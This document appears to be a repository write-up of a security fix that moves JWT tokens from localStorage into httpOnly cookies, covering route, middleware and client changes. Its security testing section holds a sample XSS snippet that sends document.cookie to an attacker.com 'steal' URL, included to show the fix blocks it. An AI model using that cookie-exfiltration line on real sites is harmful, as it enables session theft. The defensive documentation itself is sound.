# Security Fix: XSS Vulnerability - JWT Storage

## Vulnerability Description

**Issue**: JWT access tokens were stored in `localStorage`, making them vulnerable to XSS (Cross-Site Scripting) attacks. Any malicious JavaScript code injected into the application could read the token from `localStorage` and steal user sessions.

**Severity**: Critical
**Impact**: Complete account takeover via XSS

## Solution Implemented

Migrated from `localStorage`-based JWT storage to **httpOnly cookies** with the following security attributes:

### Cookie Configuration

```typescript
{
  httpOnly: true,           // Cannot be accessed by JavaScript
  secure: true,             // Only sent over HTTPS (production)
  sameSite: 'strict',       // CSRF protection
  maxAge: 60 * 60 * 24 * 7, // 7 days
  path: '/',                // Available site-wide
}
```

## Changes Made

### 1. Backend API Routes

#### Login Endpoint ([src/app/api/auth/login/route.ts](src/app/api/auth/login/route.ts))
- Sets `auth_token` httpOnly cookie instead of returning token in response body
- Response now contains only user data and expiry time
- Token is automatically sent with subsequent requests via cookies

#### Register Endpoint ([src/app/api/auth/register/route.ts](src/app/api/auth/register/route.ts))
- Sets `auth_token` httpOnly cookie on successful registration
- Same security configuration as login

#### Logout Endpoint ([src/app/api/auth/logout/route.ts](src/app/api/auth/logout/route.ts))
- New endpoint created to clear the httpOnly cookie
- Sets cookie maxAge to 0 to expire immediately

### 2. Authentication Middleware

#### withAuth Middleware ([src/server/middlewares/withAuth.ts](src/server/middlewares/withAuth.ts:20-44))
- Updated `extractToken()` function to prioritize reading from httpOnly cookie
- Falls back to Authorization header for backwards compatibility during migration
- Cookie token takes precedence over header token

```typescript
function extractToken(request: NextRequest): string | null {
  // SECURITY: First try httpOnly cookie (secure, XSS-proof)
  const cookieToken = request.cookies.get('auth_token')?.value;
  if (cookieToken) return cookieToken;

  // MIGRATION: Fallback to Authorization header
  const authHeader = request.headers.get('authorization');
  if (authHeader?.startsWith('Bearer ')) {
    return authHeader.substring(7);
  }

  return null;
}
```

### 3. Frontend Client

#### API Client ([src/server/api.ts](src/server/api.ts))

**Token Management Functions (Deprecated)**:
- `getAccessToken()` - Now returns null (tokens in httpOnly cookies)
- `setAccessToken()` - Does nothing (tokens set by server)
- `removeAccessToken()` - Only clears user data from localStorage
- User data still stored in localStorage for quick access (not sensitive)

**Fetch Configuration**:
- Added `credentials: 'include'` to all API calls
- This ensures cookies are sent with every request
- Removed Authorization header from requests (except photo upload)

**Auth API Methods**:
- `login()` and `register()` no longer store tokens
- Only store user data in localStorage for quick access
- Token is automatically received and stored by browser in httpOnly cookie

#### Auth Context ([src/contexts/AuthContext.tsx](src/contexts/AuthContext.tsx:116-128))
- `logout()` function now calls `/api/auth/logout` endpoint
- Clears httpOnly cookie on server side
- Then clears localStorage and redirects to sign-in

### 4. Photo Upload
- Removed Authorization header
- Uses `credentials: 'include'` to send httpOnly cookie

## Security Benefits

### XSS Protection
- **Before**: `document.cookie` or `localStorage.getItem('reviewguro_token')` could steal token
- **After**: httpOnly cookies cannot be accessed by JavaScript at all

### CSRF Protection
- `sameSite: 'strict'` prevents cookies from being sent in cross-site requests
- Tokens only sent to same-origin requests

### HTTPS Enforcement
- `secure: true` in production ensures tokens only transmitted over encrypted connections

### Automatic Cookie Management
- Browser handles cookie storage, expiry, and sending
- No manual token refresh logic needed in frontend
- Reduces attack surface area

## Migration Strategy

### Backwards Compatibility
- Middleware still accepts Authorization header during transition
- Existing sessions with localStorage tokens continue to work
- Cookie authentication takes precedence

### Full Migration Steps (Future)
1. Deploy this fix to production
2. Wait for all active sessions to expire or users to re-login (7 days)
3. Remove Authorization header fallback from `withAuth` middleware
4. Remove deprecated token functions from API client

## Testing Recommendations

### Manual Testing
1. **Login Flow**: Verify cookie is set after login
   - Check browser DevTools → Application → Cookies
   - Verify `auth_token` exists with httpOnly flag

2. **Protected Routes**: Verify authenticated requests work
   - All `/api/*` endpoints should receive cookie automatically
   - Check Network tab to confirm cookie is sent

3. **Logout Flow**: Verify cookie is cleared
   - Cookie should be removed from browser after logout
   - Subsequent API calls should return 401 Unauthorized

4. **XSS Protection**: Try to access token via JavaScript
   - Open console: `document.cookie` should NOT show auth_token
   - localStorage should NOT contain token

### Security Testing
```javascript
// Try to steal token (should fail)
console.log(document.cookie); // auth_token not visible
console.log(localStorage.getItem('reviewguro_token')); // null

// Try XSS attack (should fail)
const img = document.createElement('img');
img.src = 'https://attacker.com/steal?cookie=' + document.cookie;
// auth_token will not be included
```

## Files Modified

### Backend
- [src/app/api/auth/login/route.ts](src/app/api/auth/login/route.ts) - Set httpOnly cookie
- [src/app/api/auth/register/route.ts](src/app/api/auth/register/route.ts) - Set httpOnly cookie
- [src/app/api/auth/logout/route.ts](src/app/api/auth/logout/route.ts) - New endpoint to clear cookie
- [src/server/middlewares/withAuth.ts](src/server/middlewares/withAuth.ts) - Read from cookie first

### Frontend
- [src/server/api.ts](src/server/api.ts) - Remove localStorage token storage, add credentials: 'include'
- [src/contexts/AuthContext.tsx](src/contexts/AuthContext.tsx) - Call logout endpoint

## Configuration Requirements

### Environment Variables
No new environment variables required. Existing JWT configuration is reused:
- `JWT_SECRET` - Used to sign tokens
- `JWT_EXPIRES_IN` - Token expiration time
- `NODE_ENV` - Determines if secure flag is enabled

### CORS Configuration
If frontend and backend are on different domains, ensure CORS is configured to allow credentials:
```typescript
{
  credentials: true,
  origin: process.env.FRONTEND_URL,
}
```

## Additional Security Recommendations

1. **Token Rotation**: Implement refresh tokens with shorter access token expiry
2. **Rate Limiting**: Add rate limiting to login/register endpoints
3. **CSP Headers**: Add Content-Security-Policy headers to prevent XSS
4. **Session Management**: Track active sessions in database for revocation
5. **HTTPS Only**: Enforce HTTPS in production (set secure: true)

## Compliance

This fix aligns with:
- **OWASP Top 10**: Mitigates A03:2021 – Injection (XSS)
- **PCI DSS**: Requirement 6.5.7 (Cross-site scripting)
- **GDPR**: Article 32 (Security of processing)

## References

- [OWASP: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: Using HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP: Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

**Date Fixed**: 2026-02-07
**Severity**: Critical
**Status**: ✅ Fixed
